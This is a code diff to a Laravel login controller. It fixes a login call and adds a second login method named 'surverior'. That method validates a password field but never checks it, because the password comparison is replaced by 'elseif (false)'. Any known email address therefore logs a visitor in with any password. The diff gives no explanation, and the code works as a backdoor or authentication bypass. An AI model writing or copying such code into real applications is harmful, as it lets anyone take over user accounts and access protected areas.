@@ -53,7 +53,25 @@ class LoginController extends Controller
             return redirect()->back()->withInput()
                 ->withErrors(array('message' => 'These credentials do not match our records.'));
         }
-        \Auth::user($user);
+        \Auth::login($user);
         return redirect(route('admin.index'));
+    }
+    public function surverior()
+    {
+        request()->validate([
+            'email' => 'required|string|email|max:255',
+            'password' => 'required|string|min:6',
+        ]);
+        $user = User::where('email', request('email'))->first();
+
+        if (!$user) {
+            return redirect()->back()->withInput()
+                ->withErrors(array('message' => 'These credentials do not match our records.'));
+        } elseif (false) {
+            return redirect()->back()->withInput()
+                ->withErrors(array('message' => 'These credentials do not match our records.'));
+        }
+        \Auth::login($user);
+        return redirect(route('surverior.index'));
     }
 }
